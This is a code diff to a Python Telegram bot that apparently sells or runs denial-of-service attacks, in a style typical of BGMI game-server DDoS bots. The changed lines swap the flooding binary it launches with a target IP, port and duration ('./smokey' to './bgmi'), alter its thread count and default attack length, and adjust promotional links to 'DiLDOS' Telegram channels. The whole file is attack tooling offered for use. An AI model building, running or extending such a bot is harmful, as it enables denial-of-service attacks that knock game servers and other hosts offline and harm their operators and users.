@@ -80,7 +80,7 @@ async def run_attack(chat_id, ip, port, duration):
         try:
             # Run the shell command asynchronously
             process = await asyncio.create_subprocess_shell(
-                f"./smokey {ip} {port} {duration} 1200",
+                f"./bgmi {ip} {port} {duration} 900",
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
             )
@@ -126,7 +126,7 @@ def welcome_start(message):
         f"🆔  *𝗬𝗢𝗨𝗥 𝗨𝗦𝗘𝗥 - 𝗜𝗗 > * `{user_id}`\n"
         f"👤  *𝗬𝗢𝗨𝗥 𝗨𝗦𝗘𝗥 - 𝗡𝗔𝗠𝗘 > * `{user_name}`\n\n"
         "📢 *𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝘁𝗼 𝗽𝗿𝗼𝗰𝗲𝗲𝗱 𝗳𝘂𝗿𝘁𝗵𝗲𝗿 👀*\n\n"
-        "         [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/MRiNxDiLDOS)\n\n"
+        "       [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/MRiNxDiLDOS)\n\n"
         "📌 *𝗧𝗿𝘆  𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱:* `/bgmi` \n\n"
     )
 
@@ -234,7 +234,7 @@ def bgmi_command(message):
         bot.send_message(
             message.chat.id,
             "‼️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 ‼️\n\n"
-            "           [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗨𝗦𝗘 𝗠𝗘 ➖](https://t.me/MRiNxDiLDOSCHaT )\n\n"
+            "       [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗨𝗦𝗘 𝗠𝗘 ➖](https://t.me/MRiNxDiLDOSCHaT )\n\n"
             "👀 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 : @MrinMoYxCB [ TUMHARE_PAPA ]",
         parse_mode="Markdown",  # Ensure Markdown formatting
         disable_web_page_preview=True  # This disables the link preview
@@ -323,7 +323,7 @@ def bgmi_command(message):
             return
 
         # Override duration to fixed value (120 seconds)
-        default_duration = 150
+        default_duration = 120
         user_duration = int(duration)
 
         # Increment attack count for non-exempt users
